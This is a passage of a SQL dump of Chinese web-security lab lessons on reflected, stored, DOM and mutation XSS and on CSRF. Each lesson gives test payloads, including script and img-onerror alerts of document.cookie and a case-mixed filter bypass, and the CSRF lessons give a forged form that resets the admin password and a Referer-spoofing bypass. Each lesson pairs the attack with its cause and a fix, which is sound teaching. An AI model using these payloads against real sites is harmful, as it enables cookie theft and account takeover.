src=’**’&gt;输出位置在**,原则上如果这个标签使用双引号{“ ”}做保护则过滤双引号就可以了，如果是单引号{‘ ’}做保护则过滤单引号就可以了。具体的过滤方式可以替换成空格或者直接做html实体编码转换。</p><p></p><p>情况三：这种情况稍微复杂一些，主要是在一些富文本比较常见。其特性也和浏览器的编码解码顺序有关，经常用在一些绕过xss的技巧当中。后面们的中级课程当中会单独去讲解。</p><p><br></p>',1,'<p>通过攻防教学实验系统中的web系统做反射型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用</p><p><br></p>'),(24,'存储型XSS基础训练一','通过攻防教学实验系统中的web系统做存储型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用','<p>1）在WEB系统中通过学习存储型XSS看看能否得到一些敏感数据<br></p><p>2）在WEB系统中的参数后面加入恶意字符测试；下面为存储型XSS得到用户数据的语句</p><p>Xss的一些常用基本测试代码:</p><p>&gt;\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&amp;\r\n\"&gt;&lt;STYLE&gt;@import\"javascript:alert(XSS)\";&lt;/STYLE&gt;\r\n;!--\"&lt;XSS&gt;=&amp;{()}\r\n&lt;IMG SRC=\"javascript:alert(XSS);\"&gt;\r\n&lt;IMG SRC=javascript:alert(XSS)&gt;\r\n&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;</p><p>在存储型xss联系环境中提交如下代码，然后刷新浏览器查看结果</p><p>vulnerabilities/web/Xss/xss_s/index.php</p><p>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:173.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:173.25pt;visibility:visible\"><v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/s2.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/s3.png\"><br></p><p>从上面的截图中可以看出数据已经被写入服务端的代码中，并且加载到了html中。具体来说是写入到了数据库中。我们可以在数据库中查看一下。</p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:388.5pt;height:48.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看出数据确实写入了数据库中。通过这种方式可以长期的窃取用户登陆的cookie，得到用户cookie以后就可以直接使用cookie登陆用户系统。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss4.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:08:02',1,NULL,'<h2><span style=\"font-size: 14px;\">1）存储型XSS漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s5.png\"></p><p>&nbsp;</p><p>从上面服务端的代码我们基本可以看出，服务端通过post方式得到前端输入的用户数据以后做了防sql注入的转义但是没做任何防xss的过来，然后直接把数据写入了数据库，导致用户输入的脏数据进入到了数据库。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s6.png\"></p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/s7.png\"></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image011.png\"></p><p>通过上面两部分代码直接从数据中读出数据展示。导致存储型xss的产生</p><p>2）存储型XSS漏洞的防范</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image005.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s8.png\"></p><p>通过这个输出点可以看到，最终输出到&lt;font&gt;&lt;/font&gt;标签之间了。所以原则上可以直接过滤掉&lt;，&gt;即可。通过html实体编码转换即可。</p><p>针对本系统可以直接采用php自带的html实体编码函数过滤。</p><p></p><p>htmlspecialchars($_GET[\'name\']);通过这种方式过滤即可。</p><p><br></p>',1,'<p>通过攻防教学实验系统中的web系统做反射型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用</p><p>\r\n\r\n\r\n\r\n&amp;eͧ3e�~</p><p><br></p>'),(25,'存储型XSS基础训练二','通过攻防教学实验系统中的web系统做存储型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过学习反射型XSS看看能否得到一些敏感数据</span><br></h1><p>2）在WEB系统中的参数后面加入恶意字符测试；下面为存储型XSS得到用户数据的语句</p><p>Xss的一些常用基本测试代码:</p><p>&gt;\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&amp;\r\n\"&gt;&lt;STYLE&gt;@import\"javascript:alert(XSS)\";&lt;/STYLE&gt;\r\n;!--\"&lt;XSS&gt;=&amp;{()}\r\n&lt;IMG SRC=\"javascript:alert(XSS);\"&gt;\r\n&lt;IMG SRC=javascript:alert(XSS)&gt;\r\n&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;</p><p>在存储型xss联系环境中提交如下代码，然后刷新浏览器查看结果</p><p>vulnerabilities/web/Xss/xss_s/index.php?action=medium</p><p>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\r\n刷新浏览器看看是否能弹出用户cookie,然后输入&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;看看是否能</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:402pt;height:206.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s21.png\" style=\"line-height: 1; max-width: 100%;\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:414.75pt;height:114.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\"></v:imagedata></v:shape></p><p>从上面的截图中可以看出数据已经被写入服务端的代码中，并且加载到了html中。具体来说是写入到了数据库中。我们可以在数据库中查看一下。</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:78.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s23.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看出数据确实写入了数据库中。通过这种方式可以长期的窃取用户登陆的cookie，得到用户cookie以后就可以直接使用cookie登陆用户系统。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss4.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:08:33',1,NULL,'<h2><span style=\"font-size: 14px;\">1）存储型XSS漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s24.png\"></p><p>通过上面的代码可以看出。$message参数已经被重重顾虑，但是$name参数缺被忽视了。通过大小写转换可以绕过简单过滤。导致了存储xss的产生。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s25.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s26.png\"></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image009.png\"></p><p>通过上面两部分代码直接从数据中读出数据展示。导致存储型xss的产生</p><p>2）存储型XSS漏洞的防范</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s27.png\" class=\"\"></p><p>通过这个输出点可以看到，最终输出到&lt;font&gt;&lt;/font&gt;标签之间了。所以原则上可以直接过滤掉&lt;，&gt;即可。通过html实体编码转换即可。</p><p>针对本系统可以直接采用php自带的html实体编码函数过滤。</p><p>htmlspecialchars($_GET[\'name\']);通过这种方式过滤即可。或者查看源码类似$message参数的过滤方式也可以。</p><p></p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image011.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/s28.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><br></p>',1,'<p>通过攻防教学实验系统中的web系统做反射型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用</p><p><br></p>'),(26,'dom型XSS基础训练','通过攻防教学实验系统中的web系统做DOM型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过学习dom型XSS看看能否得到一些敏感数据</span><br></h1><p>2）在WEB系统中的参数后面加入恶意字符测试；下面为dom型XSS得到用户数据的语句</p><p>Xss的一些常用基本测试代码:</p><p>&gt;\"&gt;&lt;script&gt;alert(\"XSS\")&lt;/script&gt;&amp;\r\n\"&gt;&lt;STYLE&gt;@import\"javascript:alert(XSS)\";&lt;/STYLE&gt;\r\n;!--\"&lt;XSS&gt;=&amp;{()}\r\n&lt;IMG SRC=\"javascript:alert(XSS);\"&gt;\r\n&lt;IMG SRC=javascript:alert(XSS)&gt;\r\n&lt;IMG SRC=JaVaScRiPt:alert(&amp;quot;XSS&lt;WBR&gt;&amp;quot;)&gt;</p><p>vulnerabilities/web/Xss/xss_d/index.php\r\n测试地址</p><p>直接输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;测试语句。看看是否弹cookie</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:189pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/d1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>发现并不弹cookie</p><p>然后语句改成&lt;img src=1\r\nonerror=alert(document.cookie)&gt;看看是否弹cookie</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/d2.png\"><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:165.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>发现成功得到用户cookie，得到用户cookie以后就可以直接使用cookie登陆用户系统。</p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss5.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:09:17',1,NULL,'<h2>三、分析与思考：</h2><p>1）dom型XSS漏洞的原理</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/d3.png\"></p><p>通过上面的代码可以看出，这种类型的xss是直接通过操作用户输入的html的dom节点来动态的插入数据的。</p><p>因为第一输入的&lt;script&gt;标签并不是dom节点所以不会动态加载。第二次输入的&lt;img&gt;标签为dom节点所以可以加载。这就是dom型xss的原理。</p><p>2）dom型XSS漏洞的防范</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/d4.png\"></p><p>通过这个输出点可以看到，最终输出到&lt;div&gt;&lt;/div&gt;标签之间了。所以原则上可以直接过滤掉&lt;，&gt;即可。通过html实体编码转换即可。针对本系统因为dom型xss直接是经过js动态获取dom节点而产生的。所以直接用js的编码过滤函数即可。如下</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/d5.png\"></p><p><br></p>',1,'<p>通过攻防教学实验系统中的web系统做DOM型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用</p><p><br></p>'),(27,'突变型XSS基础训练','通过攻防教学实验系统中的web系统突变型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过之前的学习了解了3中xss类型。今天的xss类型比较特殊为突变型xss。以前的漏洞我们很少讲原理，我们是想通过实战的操作，让学生有一个初步的体会，产生兴趣然后再反过来思考原理。今天找个漏洞的思想很奇特也很关键，所以我们先简单介绍一下原理。</span><br></h1><p>2）Mxss的基本思想就是当我们输入一段没有危害的代码之后，通过浏览器的编码，解码或者一些过滤器的过滤等各种方式会将这段没有危害的代码最终变成有害的代码。可以参照下面的图例：</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:334.5pt;\r\n height:291pt\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\Administrator\\AppData\\Roaming\\Tencent\\Users\\652827633\\QQ\\WinTemp\\RichOle\\_FW8$U$O6F@T%5d_%602%7dV$N4$I.png\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/m1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>3）上面的图例来自于国内xss顶尖级高手gainover（听说他是生物学博士）。通过他本人的同意我将此图贴上作为一个mxss的原理讲解。</p><p>4）回到我们的系统，再输入框中输入如下的数据：</p><p>5）&lt;listing&gt;&amp;lt;img src=1\r\nonerror=alert(1) &amp;gt;&lt;/listing&gt;。我们可以看到这段代码是没有危害的。因为&lt;&gt;都已经被实体转码，但是在低版本的浏览器中测试可以发现alert出来的时候变成了如下的代码，成为了有害的代码</p><p>6）&lt;LISTING&gt;&lt;img src=1 onerror=alert(1)\r\n&gt;&lt;/LISTING&gt;</p><p>7）此漏洞的测试需要在较低的ie浏览器做，如果不成功可以参考我们给的技术参考手册。</p><p>8）此章节更高级的mxss将在后期的版本中更新。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/xss5.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:10:05',1,NULL,'<h2><span style=\"font-size: 14px;\">1）突变型XSS漏洞的原理（你是否理解清楚了）</span><br></h2><p></p><p>2）突变型XSS漏洞的防范</p><p><br></p>',1,'<p>通过攻防教学实验系统中的web系统突变型XSS练习，并且深刻认识掌握其原理，从而理解反射型在不同场景中的应用</p><p><br></p>'),(28,'CSRF基础训练一','CSRF基础训练以实战环境为主的基础训练','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过学习CSRF漏洞看看能否修改用户数据</span><br></h1><p>2）下面是在WEB系统中利用CSRF漏洞修改用户数据的例子</p><p>&nbsp;</p><p>打开CSRF页面，查看源代码复制from标签之前的内容，如下:</p><p>&lt;form action=\"#\" method=\"GET\"&gt; New\r\npassword:&lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_new\"&gt;&lt;br&gt;</p><p>Confirm new password: &lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_conf\"&gt;&lt;br&gt;</p><p>&lt;input type=\"submit\" value=\"Change\"\r\nname=\"Change\"&gt;</p><p>&lt;/form&gt;</p><p>&nbsp;</p><p>并修改其中的aciton值为网站链接地址；如下:</p><p>&lt;form action=\"http://*****/vulnerabilities/web/Cam_request/cam_csrf/index.php\"\r\nmethod=\"GET\"&gt; New password:&lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_new\"&gt;&lt;br&gt;</p><p>Confirm new password: &lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_conf\"&gt;&lt;br&gt;</p><p>&lt;input type=\"submit\" value=\"Change\"\r\nname=\"Change\"&gt;</p><p>&lt;/form&gt;</p><p>保存内容为scrf.html；然后使用浏览器打开并输入新的密码，提交表单；</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:179.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf11.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>&nbsp;</p><pre>提示”Password Changed” 信息；表示测试CSRF漏洞成功！<o:p></o:p></pre><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:192.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf12.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>通过上面的操作就可以将admin账户的密码修改为用户自己在本地设置的密码。测试中我修改成了123456789。测试成功以后用户可以退出admin账号使用新密码看看是否可以登陆成功。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/csrf1.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:11:35',1,NULL,'<h2><span style=\"font-size: 14px;\">1）CSRF漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf3.png\"></p><p>通过上面的代码我们可以发现在写代码的时候并没有检查post表单的来源，导致而已攻击者在本地构造好表单以后可以欺骗管理员点击而已文件，从而修改管理员的密码。</p><p>2）CSRF漏洞的防范</p><p>Csrf漏洞的防范有很多方法。最直接有效的方法就是加验证码，因为验证码每次都是随机变换的所以攻击不能猜出当前系统中页码的验证码。但是由于验证码会影响用户的体验，所以一般在表单中都会增加一个隐藏的token，这个token也是随机变换的。每次刷新表单都会随机生成。还有比较常见的修复方案就是验证HTTP_REFERER参数，但是这种单纯的修复方案容易被攻击者绕过。针对本系统的场景修复其实很简单。只需要让用户输入旧密码即可。这个旧密码其实充当了验证码的角色，因为攻击者并不知道admin账号原来的密码是什么。如果知道他就直接登陆了，不需要使用scrf来重置admin账号的密码了。</p><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf4.png\"></p><p></p><p>上面为修复以后的代码片段。</p><p><br></p>',1,'<p>CSRF基础训练以实战环境为主的基础训练</p><p><br></p>'),(29,'CSRF基础训练二','CSRF基础训练二的描述部分','<h1><span style=\"font-size: 14px;\">1）在WEB系统中通过学习CSRF漏洞看看能否修改用户数据</span><br></h1><p>2）下面是在WEB系统中利用CSRF漏洞修改用户数据的例子</p><p>&nbsp;</p><p>打开CSRF页面，查看源代码复制from标签之前的内容，如下:</p><p>&lt;form action=\"#\" method=\"GET\"&gt; New\r\npassword:&lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_new\"&gt;&lt;br&gt;</p><p>Confirm new password: &lt;br&gt; </p><p>&lt;input type=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_conf\"&gt;&lt;br&gt;</p><p>&lt;input type=\"submit\" value=\"Change\"\r\nname=\"Change\"&gt;</p><p>&lt;/form&gt;</p><p>&nbsp;</p><p>并修改其中的aciton值为网站链接地址；如下:</p><p>&lt;form action=\"http://*******/vulnerabilities/web/Cam_request/cam_csrf/index.php\"\r\nmethod=\"GET\"&gt; New password:&lt;br&gt;</p><p>&lt;input\r\ntype=\"hidden\" name=\"action\"\r\nvalue=\"medium\"&gt;&lt;br&gt;</p><p>&lt;input\r\ntype=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_new\"&gt;&lt;br&gt;</p><p>Confirm new password: &lt;br&gt;\r\n</p><p>&lt;input\r\ntype=\"password\" AUTOCOMPLETE=\"off\"\r\nname=\"password_conf\"&gt;&lt;br&gt;</p><p>&lt;input\r\ntype=\"submit\" value=\"Change\" name=\"Change\"&gt;</p><p>&lt;/form&gt;</p><p>保存内容为scrf.html；然后使用浏览器打开并输入新的密码，提交表单；</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:6in;height:179.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf21.png\" style=\"line-height: 1; max-width: 100%;\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf22.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:6in;height:176.25pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\"></v:imagedata></v:shape></p><p>通过上面的操作我们发现并不能修改掉admin账号当前的登陆密码。然后我们通过抓包工具修改一些参数试一试：</p><p><v:shape id=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:6in;height:165pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf23.png\" style=\"line-height: 1; max-width: 100%;\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf24.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape id=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:6in;height:183.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\"></v:imagedata></v:shape></p><p>&nbsp;</p><p>通过修改http的头部信息增加了 referer参数，然后我们提交看看</p><p><v:shape id=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:6in;height:204.75pt;visibility:visible\">\r\n <v:imagedata src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\test\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf25.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>此时我们发现提交成功。</p><p><br></p>',2,'http://oda8mr8yr.bkt.clouddn.com/csrf2.jpg','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-09-22 10:12:22',1,NULL,'<h2><span style=\"font-size: 14px;\">1）CSRF漏洞的原理</span><br></h2><p><img src=\"file:///C:/Users/test/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf26.png\"></p><p>通过上面的代码我们可以发现这节课的测试中做了一点过滤。通过http_referer来判断页面的来源。如果直接提交页面来源肯定是有问题的所以不能直接修改admin账号的密码。我们通过抓包工具可以绕过这种限制。直接在http的头部增加referer参数即可。如上面的图片所示。</p><p>2）CSRF漏洞的防范</p><p>Csrf漏洞的防范有很多方法。最直接有效的方法就是加验证码，因为验证码每次都是随机变换的所以攻击不能猜出当前系统中页码的验证码。但是由于验证码会影响用户的体验，所以一般在表单中都会增加一个隐藏的token，这个token也是随机变换的。每次刷新表单都会随机生成。还有比较常见的修复方案就是验证HTTP_REFERER参数，但是这种单纯的修复方案容易被攻击者绕过。针对本系统的场景修复其实很简单。只需要让用户输入旧密码即可。这个旧密码其实充当了验证码的角色，因为攻击者并不知道admin账号原来的密码是什么。如果知道他就直接登陆了，不需要使用scrf来重置admin账号的密码了。</p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/csrf27.png\">&nbsp;<img 